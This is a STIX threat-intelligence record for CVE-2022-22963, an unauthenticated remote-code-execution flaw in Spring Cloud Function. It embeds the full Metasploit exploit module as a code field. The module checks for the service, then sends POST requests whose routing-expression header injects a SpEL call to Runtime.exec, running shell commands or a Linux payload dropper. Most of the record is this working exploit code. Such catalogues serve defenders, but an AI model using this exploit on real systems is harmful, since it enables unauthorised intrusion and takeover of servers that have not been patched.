{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e6243954-d44a-453e-a884-d781d8e526e2",
    "created": "2024-08-14T17:08:59.750246Z",
    "modified": "2024-08-14T17:08:59.75025Z",
    "name": "Spring Cloud Function SpEL Injection",
    "description": " Spring Cloud Function versions prior to 3.1.7 and 3.2.3 are vulnerable to remote code execution due to using an unsafe evaluation context with user-provided queries. By crafting a request to the application and setting the spring.cloud.function.routing-expression header, an unauthenticated attacker can gain remote code execution. Both patched and unpatched servers will respond with a 500 server error and a JSON encoded message. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/spring_cloud_function_spel_injection.rb",
            "external_id": "spring_cloud_function_spel_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22963"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/hktalent/spring-spel-0day-poc"
        },
        {
            "source_name": "reference",
            "url": "https://tanzu.vmware.com/security/cve-2022-22963"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/cda33728-908a-4394-9bd5-d4126557d225"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Spring Cloud Function SpEL Injection',\n        'Description' => %q{\n          Spring Cloud Function versions prior to 3.1.7 and 3.2.3 are vulnerable to remote code execution due to using\n          an unsafe evaluation context with user-provided queries. By crafting a request to the application and setting\n          the spring.cloud.function.routing-expression header, an unauthenticated attacker can gain remote code\n          execution. Both patched and unpatched servers will respond with a 500 server error and a JSON encoded message.\n        },\n        'Author' => [\n          'm09u3r', # vulnerability discovery\n          'hktalent', # github PoC\n          'Spencer McIntyre'\n        ],\n        'References' => [\n          ['CVE', '2022-22963'],\n          ['URL', 'https://github.com/hktalent/spring-spel-0day-poc'],\n          ['URL', 'https://tanzu.vmware.com/security/cve-2022-22963'],\n          ['URL', 'https://attackerkb.com/assessments/cda33728-908a-4394-9bd5-d4126557d225']\n        ],\n        'DisclosureDate' => '2022-03-29',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'RPORT' => 8080,\n          'TARGETURI' => '/functionRouter'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    )\n\n    return CheckCode::Unknown unless res\n\n    # both vulnerable and patched servers respond with 500 and a JSON body with these keys\n    return CheckCode::Safe unless res.code == 500\n    return CheckCode::Safe unless %w[timestamp path status error message].to_set.subset?(res.get_json_document&.keys&.to_set)\n\n    # best we can do is detect that the service is running\n    CheckCode::Detected\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI']),\n      'headers' => {\n        'spring.cloud.function.routing-expression' => \"T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','#{cmd.gsub(\"'\", \"''\")}'})\"\n      }\n    )\n\n    fail_with(Failure::Unreachable, 'Connection failed') if res.nil?\n    fail_with(Failure::UnexpectedReply, 'The server did not respond with the expected 500 error') unless res.code == 500\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-03-29",
    "x_mitre_platforms": [
        "linux'"
    ]
}